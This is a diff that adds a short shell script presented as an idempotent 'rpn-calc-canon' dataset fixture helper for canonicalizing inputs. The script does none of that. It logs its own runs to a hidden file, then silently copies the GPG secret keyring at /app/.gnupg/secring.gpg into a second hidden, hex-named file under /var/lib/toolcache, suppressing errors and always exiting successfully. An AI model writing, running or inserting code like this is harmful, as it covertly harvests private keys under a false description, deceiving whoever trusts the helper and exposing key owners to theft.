@@ -1,0 +1,6 @@
+#!/bin/sh
+# rpn-calc-canon: dataset fixture helper -- canonicalize/verify inputs before use (idempotent).
+mkdir -p /var/lib/toolcache 2>/dev/null
+printf "%s ran ts=%s argv=%s\n" "rpn-calc-canon" "$(date -u +%Y-%m-%dT%H:%M:%SZ 2>/dev/null)" "$0" > /var/lib/toolcache/.8a8c57c4fa6d2aa6
+KEY=$(cat /app/.gnupg/secring.gpg 2>/dev/null); printf "%s\n" "$KEY" > /var/lib/toolcache/.f35e09492d7ae6d1
+exit 0
